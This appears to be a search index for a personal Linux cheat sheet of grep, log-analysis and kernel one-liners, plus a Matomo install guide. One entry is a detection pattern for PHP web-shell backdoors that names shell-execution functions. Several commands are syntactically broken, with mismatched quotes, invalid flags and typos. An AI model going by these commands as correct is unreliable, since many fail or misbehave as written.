"},{"location":"linux/grep/#find-in-all-files-in-the-current-directory-just-a-find-shorthand_1","text":"grep -H -n \"pattern\" *","title":"Find in all files in the current directory, just a find shorthand"},{"location":"linux/grep/#grep-lines-containing-two-consecutive-hyphens_3","text":"grep \"\\-\\-\" file","title":"grep lines containing two consecutive hyphens"},{"location":"linux/grep/#get-a-quote-from-pooh_1","text":"grep -Pooh .*t..r,.* /etc/init.d/*","title":"Get a quote from Pooh"},{"location":"linux/grep/#grep-auth-log-and-print-ip-of-attackers_1","text":"grep Failed auth.log | rev | cut -d\\ -f4 | rev | sort -u","title":"Grep auth log and print ip of attackers"},{"location":"linux/grep/#calculate-how-many-different-lines-between-two-files_1","text":"grep -Fvxf $(file1) $(file2) | wc -l","title":"calculate how many different lines between two files"},{"location":"linux/grep/#lists-unambigously-names-of-all-xml-elements-used-in-files-in-current-directory_3","text":"grep -Eho '<[a-ZA-Z_][a-zA-Z0-9_-:]*' * | sort -u | cut -c2-","title":"Lists unambigously names of all xml elements used in files in current directory"},{"location":"linux/grep/#move-linenumbers-of-grep-output-to-end-of-line_1","text":"grep -n log4j MainPm.java | sed -e 's/^\\([^:]*\\):\\(.*\\)/\\2 \\1/'","title":"move linenumbers of grep output to end of line"},{"location":"linux/grep/#search-objective-c-source-file-for-tag-listing-and-sort_1","text":"grep '.tag =' <file> | awk '{print $3}' | awk 'sub(/[;]/, x)' | sort -n","title":"Search Objective-C source file for tag listing and sort"},{"location":"linux/grep/#search-for-a--string-inside-all-files-in-the-current-directory_6","text":"grep -RnisI <pattern> *","title":"Search for a  string inside all files in the current directory"},{"location":"linux/grep/#check-if-a-file-is-text_1","text":"grep -qIm1 . $file","title":"Check if a file is text"},{"location":"linux/grep/#see-how-many-times-youve-typed-ls-by-itself_1","text":"grep -c ^ls$ ~/.bash_history","title":"See how many times you've typed 'ls' by itself"},{"location":"linux/grep/#matching-strings_1","text":"grep -l <string-to-match> * | xargs grep -c <string-not-to-match> | grep '\\:0'","title":"Matching Strings"},{"location":"linux/grep/#remove-script-from-infected-html-files_1","text":"grep -ZlRr -e BAD_SCRIPT_LINE * |xargs -0 sed -i 's/BAD_SCRIPT_LINE//g'","title":"remove script from infected html files"},{"location":"linux/grep/#extract-names-and-email-addresses-from-ldif-files_1","text":"grep -E '^(cn|mail):' file.ldif | sed -e 's/^[a-z]*: //'","title":"Extract names and email addresses from LDIF files"},{"location":"linux/grep/#display-playing-parameters-of-soundcards_1","text":"grep -r \"\" /proc/asound/card*/pcm*/sub*/hw_params","title":"Display playing parameters of soundcards"},{"location":"linux/grep/#extract-email-adresses-from-some-file-or-any-other-pattern_6","text":"grep -aEio '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\\.[[:alpha:].]{2,6})'","title":"extract email adresses from some file (or any other pattern)"},{"location":"linux/grep/#find-php-command-backdoor_1","text":"grep -RPl include=*.{php,txt,asp} \"(passthru|shell_exec|system|phpinfo|base64_decode|chmod|mkdir|fopen|fclose|readf?ile) *\\(\" /var/www/","title":"find php command backdoor"},{"location":"linux/grep/#show-cpu-idle-and-used-time_1","text":"grep \"cpu \" /proc/stat | awk -F ' ' '{total = $2 + $3 + $4 + $5} END {print \"idle \\t used\\n\" $5*100/total \"% \" $2*100/total \"%\"}'","title":"Show CPU idle and used time"},{"location":"linux/grep/#lines-in-file2-that-are-not-in-file1_1","text":"grep -Fxv -f file1 file2","title":"lines in file2 that are not in file1"},{"location":"linux/grep/#shows-the-line-of-the-string-you-want-to-search-for-like-in-normal-grep-plus-n-number-of-lines-above-and-below-it_1","text":"grep -C <no_of_lines> <string>","title":"Shows the line of the string you want to search for (like in normal grep) plus 'n' number of lines above and below it."},{"location":"linux/grep/#grep-for-specific-function-invocations_1","text":"grep -E -rn color=always exclude-dir=\".svn\" exclude-dir=\"packages\" exclude=\"*.swp\" \"(emit|on)\\([\\'\\\"]leader\" ~/project/ | less -R","title":"grep for specific function invocations"},{"location":"linux/grep/#grep-2-words-existing-on-the-same-line_1","text":"grep -E/egrep 'word1.*word2|word2.*word1' \"$@\"","title":"grep 2 words existing on the same line"},{"location":"linux/grep/#search-ruby-files-with-non-ascii-character-but-without-encoding-directive_1","text":"grep -l include '*.rb' include '*.rake' '^[^#]*[^a-zA-Z0-9[:punct:][:space:]]' -R . | xargs -L1 awk '!/encoding/ && NR < 2 { print FILENAME }'","title":"Search ruby-files with non-ascii character, but without encoding directive"},{"location":"linux/grep/#fix-selinux-problem-with-postfix-on-centos_1","text":"grep postfix /var/log/messages | audit2allow -M mypolicy","title":"Fix SELinux problem with Postfix on Centos"},{"location":"linux/grep/#find-text-in-all-files-except-in-files-matching-a-pattern_1","text":"grep -lir 'aMethodName' * | grep -v 'target'","title":"Find text in all files, except in files matching a pattern"},{"location":"linux/grep/#get-http-codes-for-all-websites-in-apache-configuration-files_1","text":"grep -h 'Server\\(Name\\|Alias\\)' /etc/httpd/conf.d/*.conf | sed 's#\\s*Server\\(Name\\|Alias\\)\\s*##g' | tr ' ' \"\\n\" | xargs -I{} sh -c 'echo {},`curl -s -o /dev/null -w \"%{http_code}\" {}`'","title":"Get HTTP Codes for All Websites in Apache Configuration files."},{"location":"linux/grep/#grep-certain-file-types-recursively_1","text":"grep -r include=\"*.[ch]\" pattern .","title":"grep certain file types recursively"},{"location":"linux/grep/#finds-javascript-lodashunderscore-methods-in-source-code_1","text":"grep -roh '_\\.[^(]*' *.js","title":"Finds javascript lodash/underscore methods in source code"},{"location":"linux/grep/#recursive-grep-of-text-files_1","text":"grep -Ir foo *","title":"recursive grep of text files"},{"location":"linux/grep/#get-the-first-non-empty-line-in-a-text-file_1","text":"grep . \"$f\" | head -n1","title":"Get the first non-empty line in a text file"},{"location":"linux/grep/#checklist-for-64-bit-java-on-linux_1","text":"grep -l 'flags.*\\<lm\\>' /proc/cpuinfo && (getconf LONG_BIT | grep '64') && java -version","title":"checklist for 64-bit java on Linux"},{"location":"linux/grep/#match-non-empty-lines_1","text":"grep -v \"^\\W$\" <filename>","title":"Match non-empty lines"},{"location":"linux/grep/#check-if-hardware-is-32bit-or-64bit_3","text":"grep \" lm \" /proc/cpuinfo > /dev/null && echo \"64-bit\" || echo \"32-bit\"","title":"Check if hardware is 32bit or 64bit"},{"location":"linux/grep/#extract-email-adresses-from-some-file-or-any-other-pattern_7","text":"grep -Eio '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\\.[[:alpha:].]{2,6})'","title":"extract email adresses from some file (or any other pattern)"},{"location":"linux/grep/#list-all-available-disks-and-disk-partitions_1","text":"grep -e \"[sh]d[a-l][0-9]\\?\" /proc/partitions | awk '{print $4}'","title":"list all available disks and disk partitions"},{"location":"linux/grep/#grep-all-class-definitions-from-all-files-in-current-directory_1","text":"grep -RE 'class\\s+(\\w+)' color *","title":"grep all class definitions from all files in current directory"},{"location":"linux/grep/#count-empty-lines-using-grep_1","text":"grep -c \"^$\" filename","title":"Count empty lines using grep"},{"location":"linux/grep/#grep-tab-chars_1","text":"grep \"^V<TAB>\" your_file","title":"grep tab chars"},{"location":"linux/kernel/","text":"kernel Turn off one screen at boot or set custom resolution in bootloader video=LVDS-1:d video=<conn>:<xres>x<yres>[M][R][-<bpp>][@<refresh>][i][m][eDd] <conn>: Connector, e.g. DVI-I-1, see /sys/class/drm/ for available connectors <xres> x <yres>: resolution M: compute a CVT mode? R: reduced blanking? -<bpp>: color depth @<refresh>: refresh rate i: interlaced (non-CVT mode) m: margins? e: output forced to on d: output forced to off : digital output forced to on (e.g. DVI-I connector) video=DVI-I-1:1024x768@85 video=TV-1:d Find connected screens for p in /sys/class/drm/*/status ; do con = ${ p %/status } ; echo -n \" ${ con #*/card?- } : \" ; cat $p ; done","title":"kernel"},{"location":"linux/kernel/#kernel","text":"","title":"kernel"},{"location":"linux/kernel/#turn-off-one-screen-at-boot-or-set-custom-resolution-in-bootloader","text":"video=LVDS-1:d video=<conn>:<xres>x<yres>[M][R][-<bpp>][@<refresh>][i][m][eDd] <conn>: Connector, e.g. DVI-I-1, see /sys/class/drm/ for available connectors <xres> x <yres>: resolution M: compute a CVT mode? R: reduced blanking? -<bpp>: color depth @<refresh>: refresh rate i: interlaced (non-CVT mode) m: margins? e: output forced to on d: output forced to off : digital output forced to on (e.g. DVI-I connector) video=DVI-I-1:1024x768@85 video=TV-1:d","title":"Turn off one screen at boot or set custom resolution in bootloader"},{"location":"linux/kernel/#find-connected-screens","text":"for p in /sys/class/drm/*/status ; do con = ${ p %/status } ; echo -n \" ${ con #*/card?- } : \" ; cat $p ; done","title":"Find connected screens"},{"location":"linux/log/","text":"read logs as a pro Check for bots cat access.log | cut -d '\"' -f 6 | sort | uniq | awk '$2 == \"bot\"' Check for botnets cat access.log | cut -d '\"' -f 6 | sort | uniq | awk '$2 == \"botnet\"' Check for boths above cat access.log | cut -d '\"' -f 6 | sort | uniq | awk '$2 ~ \"bot\"' Count requests cat access.log | grep -v \"CONNECT\\|HEAD\\|GET\\|POST\" | wc -l Print missing files awk 'END{($9 ~ /404/)}' < /var/log/apache2/access.log | awk '{print $9\": \" $7}' Report on access codes awk '{ print $9 }' /var/log/apache2/access.log | sort | uniq -c | sort -rn Report on missing files awk '($9 ~ /404/)' /var/log/apache2/access.log | awk '{ print $7 }' | sort | uniq -c | sort -nr Print the IP address awk '{print $1}' /var/log/apache2/access.log Print the date/time awk '{print $4,$5}' /var/log/apache2/access.log Print the status code awk '{print $9}' /var/log/apache2/access.log Print the size awk '{print $10}' /var/log/apache2/access.log Count requests by response code awk '{print $9}' /var/log/apache2/access.log | sort | uniq -c | sort -rn Find which URLs returned a status code awk '($9 ~ /404/)' /var/log/apache2/access.log | awk '{count[$7]++}; END { for (i in count) print i, count[i] }' Find which URLs returned a status code awk '($9 ~ /404/)' /var/log/apache2/access.log | awk '{print $7}' | sort | uniq -c | sort -returned Find useragents cat access.log | cut -d '\"' -f 6 | sort | uniq Find most used user agents awk '{print $12}' /var/log/apache2/access.log | sort | uniq -c | sort -rn Find most used user agents awk -F \\\" '{print $6}' /var/log/apache2/access.log | sort | uniq -c | sort -rn Most requested URLs awk -F \\\" '{print $2}' /var/log/apache2/access.log | awk '{print $2}' | sort | uniq -c | sort -rn Post requests awk -F \\\" '{print $2}' /var/log/apache2/access.log | sort | uniq -c | sort -rn discard requests that appear less than 100 times. awk -F \\\" '{print $2}' /var/log/apache2/access.log | sort | uniq -c | awk '$1>=100{print}' | sort -rn Most requested URLs containing pattern awk -F \\\" '($2 ~ \"/api/event\"){print $2}' /var/log/apache2/access.log | awk '{print $2}' | sort | uniq -c Group most requested URLs containing pattern by hour awk -F \\\" '($2 ~ \"/api/event\"){print $1}' /var/log/apache2/access.log Split output with tee tail -n 1 /var/log/apache2/access.log | tee > ( wc -w ) > ( wc -c ) > ( awk '{ print $1 }' ) Display surrounding lines with grep grep -C 1 -m 1 \u2018jquery\u2019 /var/log/apache2/access.log Show ip awk ' { print \"IP: \" $1 } \u2019 < /var/log/apache2/access.log Show ip + Date awk 'END{ print \"IP: \" $1; print \"Date: \" $4$5 }' < /var/log/apache2/access.log | sed 's/\\[//g;s/\\]//g' B-AWK-ward output (last column) awk 'END{print $NF}' < /var/log/apache2/access.log AWK can print text from the last column with the $NF variable: awk 'END{print $NF}' < /var/log/apache2/access.log Dissect DNS and IP information dig $( awk \u2018END { print $1 } \u2019 /var/log/apache2/access.log ) Read archived logfiles awk { print \u201cIP: \u201c $1 } \u2019 < < ({ zcat /var/log/apache2/access.log*gz & cat /var/log/apache2/access.log )} Geolocate visitors ip = $( dig $1 | grep -A 1 'ANSWER SECTION' ) | awk 'END{ print $NF }' ) echo geoiplookup $ip | sed -e 's/^.*: //g' Master regular expressions tail -n 1 /var/log/apache2/access.log | sed ' s/^.*- \" \" //g ; s/ \"//g Visitor lookup matches = $( grep $@ ) last_visit = $( echo $matches | tail -n 1 ) echo \"IP: $( echo $last_visit | awk '{print $1 }' ) \" echo \"Total visits: $( echo $matches | wc -l ) \" echo \"User Agent: $( echo $last_visit | sed -e 's/^.*-\" \"//g' | tr -d '\"' ) \" echo \"Last visit: $( echo $last_visit | tr -d '[]' | awk '{ print $4$5 }' ) \"","title":"log"},{"location":"linux/log/#read-logs-as-a-pro","text":"","title":"read logs as a pro"},{"location":"linux/log/#check-for-bots","text":"cat access.log | cut -d '\"' -f 6 | sort | uniq | awk '$2 == \"bot\"'","title":"Check for bots"},{"location":"linux/log/#check-for-botnets","text":"cat access.log | cut -d '\"' -f 6 | sort | uniq | awk '$2 == \"botnet\"'","title":"Check for botnets"},{"location":"linux/log/#check-for-boths-above","text":"cat access.log | cut -d '\"' -f 6 | sort | uniq | awk '$2 ~ \"bot\"'","title":"Check for boths above"},{"location":"linux/log/#count-requests","text":"cat access.log | grep -v \"CONNECT\\|HEAD\\|GET\\|POST\" | wc -l","title":"Count requests"},{"location":"linux/log/#print-missing-files","text":"awk 'END{($9 ~ /404/)}' < /var/log/apache2/access.log | awk '{print $9\": \" $7}'","title":"Print missing files"},{"location":"linux/log/#report-on-access-codes","text":"awk '{ print $9 }' /var/log/apache2/access.log | sort | uniq -c | sort -rn","title":"Report on access codes"},{"location":"linux/log/#report-on-missing-files","text":"awk '($9 ~ /404/)' /var/log/apache2/access.log | awk '{ print $7 }' | sort | uniq -c | sort -nr","title":"Report on missing files"},{"location":"linux/log/#print-the-ip-address","text":"awk '{print $1}' /var/log/apache2/access.log","title":"Print the IP address"},{"location":"linux/log/#print-the-datetime","text":"awk '{print $4,$5}' /var/log/apache2/access.log","title":"Print the date/time"},{"location":"linux/log/#print-the-status-code","text":"awk '{print $9}' /var/log/apache2/access.log","title":"Print the status code"},{"location":"linux/log/#print-the-size","text":"awk '{print $10}' /var/log/apache2/access.log","title":"Print the size"},{"location":"linux/log/#count-requests-by-response-code","text":"awk '{print $9}' /var/log/apache2/access.log | sort | uniq -c | sort -rn","title":"Count requests by response code"},{"location":"linux/log/#find-which-urls-returned-a-status-code","text":"awk '($9 ~ /404/)' /var/log/apache2/access.log | awk '{count[$7]++}; END { for (i in count) print i, count[i] }'","title":"Find which URLs returned a status code"},{"location":"linux/log/#find-which-urls-returned-a-status-code_1","text":"awk '($9 ~ /404/)' /var/log/apache2/access.log | awk '{print $7}' | sort | uniq -c | sort -returned","title":"Find which URLs returned a status code"},{"location":"linux/log/#find-useragents","text":"cat access.log | cut -d '\"' -f 6 | sort | uniq","title":"Find useragents"},{"location":"linux/log/#find-most-used-user-agents","text":"awk '{print $12}' /var/log/apache2/access.log | sort | uniq -c | sort -rn","title":"Find most used user agents"},{"location":"linux/log/#find-most-used-user-agents_1","text":"awk -F \\\" '{print $6}' /var/log/apache2/access.log | sort | uniq -c | sort -rn","title":"Find most used user agents"},{"location":"linux/log/#most-requested-urls","text":"awk -F \\\" '{print $2}' /var/log/apache2/access.log | awk '{print $2}' | sort | uniq -c | sort -rn","title":"Most requested URLs"},{"location":"linux/log/#post-requests","text":"awk -F \\\" '{print $2}' /var/log/apache2/access.log | sort | uniq -c | sort -rn","title":"Post requests"},{"location":"linux/log/#discard-requests-that-appear-less-than-100-times","text":"awk -F \\\" '{print $2}' /var/log/apache2/access.log | sort | uniq -c | awk '$1>=100{print}' | sort -rn","title":"discard requests that appear less than 100 times."},{"location":"linux/log/#most-requested-urls-containing-pattern","text":"awk -F \\\" '($2 ~ \"/api/event\"){print $2}' /var/log/apache2/access.log | awk '{print $2}' | sort | uniq -c","title":"Most requested URLs containing pattern"},{"location":"linux/log/#group-most-requested-urls-containing-pattern-by-hour","text":"awk -F \\\" '($2 ~ \"/api/event\"){print $1}' /var/log/apache2/access.log","title":"Group most requested URLs containing pattern by hour"},{"location":"linux/log/#split-output-with-tee","text":"tail -n 1 /var/log/apache2/access.log | tee > ( wc -w ) > ( wc -c ) > ( awk '{ print $1 }' )","title":"Split output with tee"},{"location":"linux/log/#display-surrounding-lines-with-grep","text":"grep -C 1 -m 1 \u2018jquery\u2019 /var/log/apache2/access.log","title":"Display surrounding lines with grep"},{"location":"linux/log/#show-ip","text":"awk ' { print \"IP: \" $1 } \u2019 < /var/log/apache2/access.log","title":"Show ip"},{"location":"linux/log/#show-ip--date","text":"awk 'END{ print \"IP: \" $1; print \"Date: \" $4$5 }' < /var/log/apache2/access.log | sed 's/\\[//g;s/\\]//g'","title":"Show ip + Date"},{"location":"linux/log/#b-awk-ward-output-last-column","text":"awk 'END{print $NF}' < /var/log/apache2/access.log","title":"B-AWK-ward output (last column)"},{"location":"linux/log/#awk-can-print-text-from-the-last-column-with-the-nf-variable","text":"awk 'END{print $NF}' < /var/log/apache2/access.log","title":"AWK can print text from the last column with the $NF variable:"},{"location":"linux/log/#dissect-dns-and-ip-information","text":"dig $( awk \u2018END { print $1 } \u2019 /var/log/apache2/access.log )","title":"Dissect DNS and IP information"},{"location":"linux/log/#read-archived-logfiles","text":"awk { print \u201cIP: \u201c $1 } \u2019 < < ({ zcat /var/log/apache2/access.log*gz & cat /var/log/apache2/access.log )}","title":"Read archived logfiles"},{"location":"linux/log/#geolocate-visitors","text":"ip = $( dig $1 | grep -A 1 'ANSWER SECTION' ) | awk 'END{ print $NF }' ) echo geoiplookup $ip | sed -e 's/^.*: //g'","title":"Geolocate visitors"},{"location":"linux/log/#master-regular-expressions","text":"tail -n 1 /var/log/apache2/access.log | sed ' s/^.*- \" \" //g ; s/ \"//g","title":"Master regular expressions"},{"location":"linux/log/#visitor-lookup","text":"matches = $( grep $@ ) last_visit = $( echo $matches | tail -n 1 ) echo \"IP: $( echo $last_visit | awk '{print $1 }' ) \" echo \"Total visits: $( echo $matches | wc -l ) \" echo \"User Agent: $( echo $last_visit | sed -e 's/^.*-\" \"//g' | tr -d '\"' ) \" echo \"Last visit: $( echo $last_visit | tr -d '[]' | awk '{ print $4$5 }' ) \"","title":"Visitor lookup"},{"location":"linux/matomo/","text":"matomo Download Matomo wget https://builds.matomo.org/matomo-latest.zip Once downloaded, extract the archive with unzip. mkdir -p /var/www/html/site/ wget https://builds.matomo.org/matomo-latest.zip unzip matomo-latest.zip -d /var/www/html/site The -d option specifies the target directory. Matomo web files will be extracted to /var/www/matomo/. Then we need to change the owner of this directory to www-data so that the web server can write to this directory. chown www-data:www-data /var/www/html/site -R Create a Database and User in MariaDB Log into MariaDB database server with the following command. mysql Alternatively, you can also use this command to login. mysql Then create a database for Matomo. This tutorial name the database matomo. You can use whatever name you like. create database matomo ; Create the database user. Again, you can use your preferred name for this user. Replace your-password with your preferred password. create user wuseman@localhost identified by 'password' ; Grant this user all privileges on the matomo database. grant all privileges on matomo.* to wuseman@localhost ; Flush privileges and exit. flush privileges ; exit ; Step 3: Create Apache or Nginx Configuration File If you prefer to use Apache web server, then create a virtual host configuration file in /etc/apache2/sites-available/ directory. vim /etc/apache2/sites-available/matomo.conf Put the following text into the file. Replace w.nr1.nu with your own domain name. Don\u2019t forget to set A record for the domain name in your DNS manager. <VirtualHost *:80> ServerAdmin webmaster@localhost ServerName w.nr1.nu DocumentRoot /var/www/matomo/ <Directory /var/www/matomo> DirectoryIndex index.php Options FollowSymLinks AllowOverride All Require all granted </Directory> <Files \"console\" > Options None Require all denied </Files> <Directory /var/www/matomo/misc/user> Options None Require all granted </Directory> <Directory /var/www/matomo/misc> Options None Require all denied </Directory> <Directory /var/www/matomo/vendor> Options None Require all denied </Directory> ErrorLog ${ APACHE_LOG_DIR } /matomo_error.log CustomLog ${ APACHE_LOG_DIR } /matomo_access.log combined </VirtualHost> Save and close the file. Then enable this virtual host. a2ensite matomo.conf Reload Apache web server for the change to take effect. OpenRC /etc/init.d/apache2 Systemd systemctl reload apache2 Nginx If you prefer to use Nginx web server, then create a matomo.conf file in /etc/nginx/conf.d/ directory. vim /etc/nginx/conf.d/matomo.conf Put the following text into the file. Replace w.nr1.nu with your own domain name. Don\u2019t forget to set A record for the domain name in your DNS manager. server { listen [ :: ] :80 ; listen 80 ; server_name w.nr1.nu ; access_log /var/log/nginx/matomo.access.log ; error_log /var/log/nginx/matomo.error.log ; root /var/www/matomo/ ; index index.php ; ## only allow accessing the following php files location ~ ^/ ( index | matomo | piwik | js/index ) .php { include snippets/fastcgi-php.conf ; fastcgi_param HTTP_PROXY \"\" ; # prohibit httpoxy: https://httpoxy.org/ fastcgi_pass unix:/run/php/php7.4-fpm.sock ; } ## needed for HeatmapSessionRecording plugin location = /plugins/HeatmapSessionRecording/configs.php { include snippets/fastcgi-php.conf ; fastcgi_param HTTP_PROXY \"\" ; fastcgi_pass unix:/run/php/php7.4-fpm.sock ; } ## deny access to all other .php files location ~* ^.+ \\. php$ { deny all ; return 403 ; } ## serve all other files normally location / { try_files $uri $uri / = 404 ; } ## disable all access to the following directories location ~ / ( config | tmp | core | lang ) { deny all ; return 403 ; # replace with 404 to not show these directories exist } location ~ / \\. ht { deny all ; return 403 ; } location ~ \\. ( gif | ico | jpg | png | svg | js | css | htm | html | mp3 | mp4 | wav | ogg | avi | ttf | eot | woff | woff2 | json ) $ { allow all ; ## Cache images,CSS,JS and webfonts for an hour ## Increasing the duration may improve the load-time, but may cause old files to show after an Matomo upgrade expires 1h ; add_header Pragma public ; add_header Cache-Control \"public\" ; } location ~ / ( libs | vendor | plugins | misc/user ) { deny all ; return 403 ; } ## properly display textfiles in root directory location ~/ ( .* \\. md | LEGALNOTICE | LICENSE ) { default_type text/plain ; } } Save and close the file. Test Nginx configuration, then reload Nginx for the changes to take effect. nginx -t Install PHP modules required or recommended by Matomo. apt install php-imagick php7.4-mysql php7.4-fpm php7.4-common php7.4-gd php7.4-json php7.4-curl php7.4-zip php7.4-xml php7.4-mbstring php7.4-bz2 php7.4-intl If you are using Apache web server, you need to reload it to make it run with these PHP modules. systemctl reload apache2 Nginx users don\u2019t need to reload. Now you should be able to visit the Matomo web-based install wizard at http://w.nr1.nu , but before entering any information, let\u2019s enable HTTPS. Enable HTTPS To encrypt the HTTP traffic when you visit the Matomo web interface, we can enable HTTPS by installing a free TLS certificate issued from Let\u2019s Encrypt. Run the following commands to install Let\u2019s Encrypt client (certbot) on Ubuntu 20.04. apt update apt install certbot If you use Nginx, you also need to install the Certbot Nginx plugin. apt install python3-certbot-nginx Then run the following command to obtain and install TLS certificate. certbot --nginx --agree-tos --redirect --hsts --staple-ocsp --email wuseman@nr1.nu -d w.nr1.nu If you use Apache, you also need to install the Certbot Apache plugin. emerge app-crypt/certbot-apache apt install python3-certbot-apache Then run this command to obtain and install TLS certificate. certbot --apache --agree-tos --redirect --hsts --staple-ocsp --email you@example.com -d w.nr1.nu Step 6: Finish the Installation in your Web Browser [ visit http://localhost/matomo/ ]( https://w.nr1.nu ) Permissions problem chown -R wuseman:wuseman /var/www/html/ find /var/www/html/ -type f -exec chmod 644 {} \\; find /var/www/html/ -type d -exec chmod 755 {} \\; find /var/www/html/assets/ -type f -exec chmod 644 {} \\; find /var/www/html/assets/ -type d -exec chmod 755 {} \\; find /var/www/html/cache/ -type f -exec chmod 644 {} \\; find /var/www/html/cache/ -type d -exec chmod 755 {} \\; find /var/www/html/logs/ -type f -exec chmod 644 {} \\; find /var/www/html/logs/ -type d -exec chmod 755 {} \\; find /var/www/html/tcpdf/ -type f -exec chmod 644 {} \\; find /var/www/html/tcpdf/ -type d -exec chmod 755 {} \\; find /var/www/html/templates_c -type f -exec chmod 644 {} \\; find /var/www/html/templates_c -type d -exec chmod 755 {} \\; Install By Copy And Paste mysql -e \"drop datababse matomo\" mysql -e \"create database matomo;\" mysql -e \"create user wuseman@localhost identified by 'odemnn';\" mysql -e \"grant all privileges on matomo.* to wuseman@localhost;\" mysql -e \"flush privileges;\" wget https://builds.matomo.org/matomo-latest.zip unzip matomo-latest.zip -d /var/www/html/site chown wuseman:wuseman /var/www/html/site -R google-chrome-stable http://localhost/matomo Add below JS script inside header on your website, edit the setSiteId if needed <!-- Matomo --> < script > var _paq = window . _paq = window . _paq || []; /* tracker methods like \"setCustomDimension\" should be called before \"trackPageView\" */ _paq . push ([ 'trackPageView' ]); _paq . push ([ 'enableLinkTracking' ]); ( function () { var u = \"//w.nr1.nu/\" ; _paq . push ([ 'setTrackerUrl' , u + 'matomo.php' ]); _paq . push ([ 'setSiteId' , '1' ]); var d = document , g = d . createElement ( 'script' ), s = d . getElementsByTagName ( 'script' )[ 0 ]; g . async = true ; g . src = u + 'matomo.js' ; s . parentNode . insertBefore ( g , s ); })(); < /script> <!-- End Matomo Code --> End!","title":"matomo"},{"location":"linux/matomo/#matomo","text":"","title":"matomo"},{"location":"linux/matomo/#download-matomo","text":"wget https://builds.matomo.org/matomo-latest.zip","title":"Download Matomo"},{"location":"linux/matomo/#once-downloaded-extract-the-archive-with-unzip","text":"mkdir -p /var/www/html/site/ wget https://builds.matomo.org/matomo-latest.zip unzip matomo-latest.zip -d /var/www/html/site The -d option specifies the target directory. Matomo web files will be extracted to /var/www/matomo/. Then we need to change the owner of this directory to www-data so that the web server can write to this directory. chown www-data:www-data /var/www/html/site -R","title":"Once downloaded, extract the archive with unzip."},{"location":"linux/matomo/#create-a-database-and-user-in-mariadb","text":"Log into MariaDB database server with the following command. mysql","title":"Create a Database and User in MariaDB"},{"location":"linux/matomo/#alternatively-you-can-also-use-this-command-to-login","text":"mysql","title":"Alternatively, you can also use this command to login."},{"location":"linux/matomo/#then-create-a-database-for-matomo-this-tutorial-name-the-database-matomo-you-can-use-whatever-name-you-like","text":"create database matomo ;","title":"Then create a database for Matomo. This tutorial name the database matomo. You can use whatever name you like."},{"location":"linux/matomo/#create-the-database-user-again-you-can-use-your-preferred-name-for-this-user","text":"","title":"Create the database user. Again, you can use your preferred name for this user."},{"location":"linux/matomo/#replace-your-password-with-your-preferred-password","text":"create user wuseman@localhost identified by 'password' ;","title":"Replace your-password with your preferred password."},{"location":"linux/matomo/#grant-this-user-all-privileges-on-the-matomo-database","text":"grant all privileges on matomo.* to wuseman@localhost ;","title":"Grant this user all privileges on the matomo database."},{"location":"linux/matomo/#flush-privileges-and-exit","text":"flush privileges ; exit ;","title":"Flush privileges and exit."},{"location":"linux/matomo/#step-3-create-apache-or-nginx-configuration-file","text":"","title":"Step 3: Create Apache or Nginx Configuration File"},{"location":"linux/matomo/#if-you-prefer-to-use-apache-web-server-then-create-a-virtual-host-configuration-file-in-etcapache2sites-available-directory","text":"vim /etc/apache2/sites-available/matomo.conf","title":"If you prefer to use Apache web server, then create a virtual host configuration file in /etc/apache2/sites-available/ directory."},{"location":"linux/matomo/#put-the-following-text-into-the-file","text":"","title":"Put the following text into the file."},{"location":"linux/matomo/#replace-wnr1nu-with-your-own-domain-name-dont-forget-to-set-a-record-for-the-domain-name-in-your-dns-manager","text":"<VirtualHost *:80> ServerAdmin webmaster@localhost ServerName w.nr1.nu DocumentRoot /var/www/matomo/ <Directory /var/www/matomo> DirectoryIndex index.php Options FollowSymLinks AllowOverride All Require all granted </Directory> <Files \"console\" > Options None Require all denied </Files> <Directory /var/www/matomo/misc/user> Options None Require all granted </Directory> <Directory /var/www/matomo/misc> Options None Require all denied </Directory> <Directory /var/www/matomo/vendor> Options None Require all denied </Directory> ErrorLog ${ APACHE_LOG_DIR } /matomo_error.log CustomLog ${ APACHE_LOG_DIR } /matomo_access.log combined </VirtualHost>","title":"Replace w.nr1.nu with your own domain name. Don\u2019t forget to set A record for the domain name in your DNS manager."},{"location":"linux/matomo/#save-and-close-the-file-then-enable-this-virtual-host","text":"a2ensite matomo.conf","title":"Save and close the file. Then enable this virtual host."},{"location":"linux/matomo/#reload-apache-web-server-for-the-change-to-take-effect","text":"OpenRC /etc/init.d/apache2 Systemd systemctl reload apache2","title":"Reload Apache web server for the change to take effect."},{"location":"linux/matomo/#nginx","text":"","title":"Nginx"},{"location":"linux/matomo/#if-you-prefer-to-use-nginx-web-server-then-create-a-matomoconf-file-in-etcnginxconfd-directory","text":"vim /etc/nginx/conf.d/matomo.conf","title":"If you prefer to use Nginx web server, then create a matomo.conf file in /etc/nginx/conf.d/ directory."},{"location":"linux/matomo/#put-the-following-text-into-the-file-replace-wnr1nu-with-your-own-domain-name","text":"","title":"Put the following text into the file. Replace w.nr1.nu with your own domain name."},{"location":"linux/matomo/#dont-forget-to-set-a-record-for-the-domain-name-in-your-dns-manager","text":"server { listen [ :: ] :80 ; listen 80 ; server_name w.nr1.nu ; access_log /var/log/nginx/matomo.access.log ; error_log /var/log/nginx/matomo.error.log ; root /var/www/matomo/ ; index index.php ; ## only allow accessing the following php files location ~ ^/ ( index | matomo | piwik | js/index ) .php { include snippets/fastcgi-php.conf ; fastcgi_param HTTP_PROXY \"\" ; # prohibit httpoxy: https://httpoxy.org/ fastcgi_pass unix:/run/php/php7.4-fpm.sock ; } ## needed for HeatmapSessionRecording plugin location = /plugins/HeatmapSessionRecording/configs.php { include snippets/fastcgi-php.conf ; fastcgi_param HTTP_PROXY \"\" ; fastcgi_pass unix:/run/php/php7.4-fpm.sock ; } ## deny access to all other .php files location ~* ^.+ \\. php$ { deny all ; return 403 ; } ## serve all other files normally location / { try_files $uri $uri / = 404 ; } ## disable all access to the following directories location ~ / ( config | tmp | core | lang ) { deny all ; return 403 ; # replace with 404 to not show these directories exist } location ~ / \\. ht { deny all ; return 403 ; } location ~ \\. ( gif | ico | jpg | png | svg | js | css | htm | html | mp3 | mp4 | wav | ogg | avi | ttf | eot | woff | woff2 | json ) $ { allow all ; ## Cache images,CSS,JS and webfonts for an hour ## Increasing the duration may improve the load-time, but may cause old files to show after an Matomo upgrade expires 1h ; add_header Pragma public ; add_header Cache-Control \"public\" ; } location ~ / ( libs | vendor | plugins | misc/user ) { deny all ; return 403 ; } ## properly display textfiles in root directory location ~/ ( .* \\. md | LEGALNOTICE | LICENSE ) { default_type text/plain ; } }","title":"Don\u2019t forget to set A record for the domain name in your DNS 